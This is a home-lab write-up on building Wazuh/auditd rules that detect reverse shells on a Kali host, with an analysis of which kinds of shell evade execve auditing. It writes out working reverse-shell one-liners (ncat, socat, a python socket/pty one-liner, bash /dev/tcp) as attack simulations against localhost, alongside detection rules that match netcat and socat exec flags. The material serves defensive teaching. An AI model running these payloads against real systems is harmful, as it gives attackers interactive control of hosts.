# Lab 07 - Reverse Shell Detection

## Objective
Detect reverse-shell execution on the Kali endpoint, and - just as
importantly - map the boundary of what command-execution auditing can
and cannot see. A reverse shell is one of the highest-value detections
in a SOC: it is the moment a foothold becomes interactive control.

## MITRE ATT&CK
| Field | Value |
|---|---|
| Tactic | Execution |
| Technique | T1059 - Command and Scripting Interpreter |
| Sub-techniques | T1059.004 (Unix Shell), T1059.006 (Python) |
| Related | T1071.001 - Application Layer Protocol |
| Reference | https://attack.mitre.org/techniques/T1059/ |

## Detection philosophy - contrast with Lab 06
Lab 06 (recon) used **burst correlation**: individual recon commands
are benign, so the signal is the *pattern* of several in a window.
A reverse shell is the opposite - a **single high-fidelity event**.
`socat TCP:host:port EXEC:/bin/bash` is malicious on sight; there is
nothing benign to correlate away. So Lab 07 uses single-event rules at
level 12, no frequency logic. Knowing *when* to correlate and when a
single event suffices is a core detection-engineering judgment.

## The reverse-shell taxonomy (this is the lab)
Reverse shells fall into three classes, and they are **not** equally
visible to `execve` auditing:

| Class | Example | Visible to execve? |
|---|---|---|
| A1 - Tool, clean args | `ncat -e /bin/bash <ip> <port>` | Yes |
| A1 - Tool, clean args | `socat TCP:<ip>:<port> EXEC:/bin/bash` | Yes |
| A2 - Interpreter, complex payload | `python3 -c 'import socket,os,pty;...'` | **No** (see below) |
| B - Shell builtin | `bash -i >& /dev/tcp/<ip>/<port> 0>&1` | **No** (see below) |

The whole lab is built around this asymmetry. Detecting Class A1 is
the easy, high-value win. Understanding *why* A2 and B evade detection
- and what would catch them - is what separates a real detection
engineer from someone who writes a rule and declares victory.

## Environment
| Component | Details |
|---|---|
| Agent | Kali GNU/Linux 2025.4 (192.168.1.161) |
| Manager | Ubuntu Server (192.168.1.79) |
| Log source | Linux Audit (auditd) -> /var/log/audit/audit.log |
| Foundation | The `audit-wazuh-c` execve config from Lab 06 |

Lab 07 reuses Lab 06's auditd foundation directly: `execve` syscalls
tagged with the recognised `audit-wazuh-c` key, which Wazuh decodes
into rule 80792 with `audit.exe`, `audit.command`, and positional
argument fields `audit.execve.a0`, `a1`, `a2`, ...

## Methodology: inspect the event before writing the rule
The correct way to build a detection is to generate the real event
first and read exactly which fields carry the signature - never guess
field names. Firing the payloads and inspecting rule 80792 gave the
decoded argument layout used by the rules below:

| Tool | audit.command | a1 | a2 |
|---|---|---|---|
| ncat | `ncat` | `-e` | `/bin/bash` |
| socat | `socat` | `TCP:127.0.0.1:4444` | `EXEC:/bin/bash` |

Two decoding gotchas surfaced during inspection:
- **exe carries variant/version suffixes**: socat logs as
  `/usr/bin/socat1` (Debian ships the binary as `socat1`), and python
  as `/usr/bin/python3.13`. Matching `audit.exe` is therefore fragile;
  the rules key on `audit.command` (the clean basename) instead.
- **arguments with spaces/quotes are hex-encoded by auditd**. This is
  the root cause of the Class A2 gap (below).

## Detection rules (on the manager)
Added to `/var/ossec/etc/rules/local_rules.xml`.

```xml
<group name="local,audit,reverse_shell,">

  <!-- Netcat/ncat exec-to-shell reverse shell -->
  <rule id="100302" level="12">
    <if_sid>80792</if_sid>
    <field name="audit.command">^ncat$|^nc$|^nc.traditional$|^nc.openbsd$</field>
    <field name="audit.execve.a1">^-e$|^-c$</field>
    <description>Reverse shell: netcat exec ($(audit.command) $(audit.execve.a1) $(audit.execve.a2)) by auid $(audit.auid)</description>
    <mitre><id>T1059.004</id><id>T1071.001</id></mitre>
  </rule>

  <!-- socat EXEC/SYSTEM to shell -->
  <rule id="100303" level="12">
    <if_sid>80792</if_sid>
    <field name="audit.command">^socat$</field>
    <field name="audit.execve.a2">^EXEC:|^SYSTEM:|^exec:|^system:</field>
    <description>Reverse shell: socat exec ($(audit.execve.a1) $(audit.execve.a2)) by auid $(audit.auid)</description>
    <mitre><id>T1059.004</id></mitre>
  </rule>

</group>
```

Design notes:
- Level 12 (high) with no correlation - a single match is actionable.
- Match `audit.command` (basename) to survive exe suffixes.
- ncat: `-e`/`-c` exec flag at `a1`. socat: `EXEC:`/`SYSTEM:` prefix at
  `a2`. Positions confirmed empirically from the live events.

## Attack simulation (on Kali, as the logged-in user)
The detection triggers on the `execve`, not on a successful callback,
so a listener is optional - each payload logs its invocation before it
even attempts to connect:

```bash
ncat -e /bin/bash 127.0.0.1 4444
socat TCP:127.0.0.1:4444 EXEC:/bin/bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("127.0.0.1",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

## Detection results

| Rule ID | Description | Severity | Result |
|---|---|---|---|
| 100302 | Reverse shell: netcat exec | Level 12 | **Confirmed firing** (auid 1000) |
| 100303 | Reverse shell: socat exec | Level 12 | **Confirmed firing** (auid 1000) |

Confirmed alerts:
```
100303  Reverse shell: socat exec (TCP:127.0.0.1:4444 EXEC:/bin/bash) by auid 1000   level 12
100302  Reverse shell: netcat exec (ncat -e /bin/bash) by auid 1000                  level 12
```

## Gaps and evasion analysis (the headline finding)

### A2 - Interpreter reverse shells evade command auditing
The python3 payload was **never detected**, and the reason is precise
and verifiable:
1. auditd **did** capture the execve (`ausearch -k audit-wazuh-c -c
   python3` shows it on the agent).
2. Its payload argument was **hex-encoded** because it contains spaces
   and quotes: `a2=696D706F7274...` (that hex decodes to
   `import socket,os,pty;...`). auditd hex-encodes any argument with
   whitespace or special characters.
3. On the manager, this produced **no rule 80792 at all** - grepping
   alerts.json for a genuine python execution returns nothing (only
   the investigation commands themselves, which contain the string
   "python3" as an argument). The hex-heavy EXECVE record is not
   surfaced as a command alert.

Because there is no 80792 parent event, no custom rule can fire on it.
A rule matching only the short `-c` flag was tested and rejected: it
cannot catch the real (always hex-encoded) reverse shells, and would
false-positive on benign short one-liners like `python3 -c 'print(1)'`
- a net-negative detection. It was removed rather than shipped.

### B - Shell builtin reverse shells have no execve
`bash -i >& /dev/tcp/<ip>/<port> 0>&1` uses bash's `/dev/tcp` internal
redirection. No separate binary is executed - the only execve is
`bash -i`, indistinguishable from a normal interactive shell. `execve`
auditing is structurally blind to it.

### Root cause and remediation
Both gaps share one root cause: **command-execution auditing only sees
process starts, not network activity.** The reverse shells that evade
it are exactly the ones whose maliciousness lives in the *network
connection*, not the command line.

The remediation is **network-layer detection**, out of scope for a
command-audit lab and deferred to later modules:
- Outbound-connection monitoring (Zeek / Suricata) - a shell or
  interpreter opening an egress socket to an unusual host/port.
- Process-to-network correlation (Sysmon Event ID 3 on Windows;
  eBPF-based tooling on Linux) - flagging a shell process that owns a
  network socket.
- Egress filtering as a control, so callbacks fail regardless.

This is the honest boundary of the Linux command-audit module and the
motivation for the Network Security and Sysmon modules on the roadmap.

## Cross-lab fix applied in this lab
Building Lab 07 exposed a bug in Lab 06's rule 100300: the pattern
`/usr/bin/nc` was not end-anchored, so it substring-matched
`/usr/bin/ncat` - every ncat execution was being mislabelled as a
recon command. Fixed by anchoring to `/usr/bin/nc$`. This is the same
"anchor short command names" lesson from Lab 06, applied to the one
pattern that had been missed.

## Lessons learned
- Reverse-shell detection via `execve` catches tool-based shells with
  readable shell-path arguments; it does not catch interpreter
  payloads (hex-encoded args) or the bash `/dev/tcp` builtin (no
  exec). Know your blind spots and name them.
- Match `audit.command`, not `audit.exe` - exe carries version/variant
  suffixes (`socat1`, `python3.13`).
- Generate the real event and read the decoded fields before writing
  the rule.
- **Validate the ruleset with `wazuh-logtest` before restarting the
  manager.** Wazuh refuses to start on an invalid ruleset; an
  unvalidated edit took the SIEM offline during this lab. The recovery
  workflow: keep a `.working` backup, write the full file via `tee`
  (not piecemeal editing), validate, then restart.
- A detection that cannot detect its target is worse than a documented
  gap - remove it and explain why.

## MITRE ATT&CK mapping
```
Execution
  |
  T1059.004 - Unix Shell (ncat -e, socat EXEC)   -> Rule 100302 / 100303  Level 12  [DETECTED]
  T1059.006 - Python (socket + pty one-liner)    -> hex-encoded execve    [EVADES - network detection needed]
  T1059.004 - bash /dev/tcp builtin              -> no execve             [EVADES - network detection needed]
```

## Status
Complete - Rules 100302 and 100303 confirmed firing at level 12 on the
attack simulation (auid 1000). Interpreter (T1059.006) and bash
`/dev/tcp` reverse shells documented as command-audit blind spots with
network-layer remediation deferred to later modules.
